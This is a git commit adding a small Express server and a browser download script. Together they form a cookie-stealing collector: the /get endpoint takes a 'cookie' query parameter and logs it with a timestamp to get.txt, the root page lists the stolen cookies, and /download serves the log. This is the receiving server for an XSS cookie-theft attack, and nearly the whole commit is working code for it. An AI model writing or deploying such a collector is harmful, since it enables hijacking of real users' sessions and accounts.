6ed93f2761124610136cdfacf83be8b91e937892
hieujoyce <nguyentrunghieuyh0602@gmail.com>
2022-12-15 13:43:41 +0700

    hieujoyce

---
+++ public/script.js
@@ -0,0 +1,14 @@
+const btnDownload = document.querySelector("#btn-download");
+
+btnDownload.addEventListener("click", async () => {
+  try {
+    const res = await fetch("/download");
+    const data = await res.blob();
+    const a = document.createElement("a");
+    a.href = window.URL.createObjectURL(data);
+    a.download = "get.txt";
+    a.click();
+  } catch (error) {
+    console.log(error);
+  }
+});
---
+++ server.js
@@ -0,0 +1,62 @@
+const express = require("express");
+const cors = require("express");
+const path = require("path");
+const moment = require("moment");
+const fs = require("fs/promises");
+
+const app = express();
+const publicPath = path.join(__dirname, "public");
+
+app.use(cors());
+app.use(express.static(publicPath));
+app.set("view engine", "ejs");
+
+app.get("/", async (req, res) => {
+  let data;
+  try {
+    const pathName = path.join(__dirname, "get.txt");
+    data = await fs.readFile(pathName, { encoding: "utf8" });
+    data = data
+      .split("\n")
+      .filter((el) => el !== "")
+      .map((el) => {
+        const [time, cookie] = el.slice(1, el.length).split("]: ");
+        return { time, cookie };
+      });
+  } catch (err) {}
+  res.render("index", {
+    cookieList: data || [],
+  });
+});
+
+app.get("/download", (req, res) => {
+  res.download(path.join(__dirname, "get.txt"));
+});
+
+app.get("/get", async (req, res) => {
+  const { cookie } = req.query;
+  if (!cookie)
+    return res.status(400).json({
+      err: "Không có cookie.",
+    });
+  try {
+    const pathName = path.join(__dirname, "get.txt");
+    const content = `[${getTime()}]: ${cookie}\n`;
+    await fs.writeFile(pathName, content, { flag: "a+" });
+  } catch (err) {
+    return res.status(500).json({
+      err: "Lỗi server.",
+    });
+  }
+  res.json({
+    msg: "Get cookie success.",
+  });
+});
+
+app.listen(5000, () => {
+  console.log("Server is running on port 5000");
+});
+
+function getTime() {
+  return `${moment().format("MMMM Do YYYY, h:mm:ss a")}`;
+}
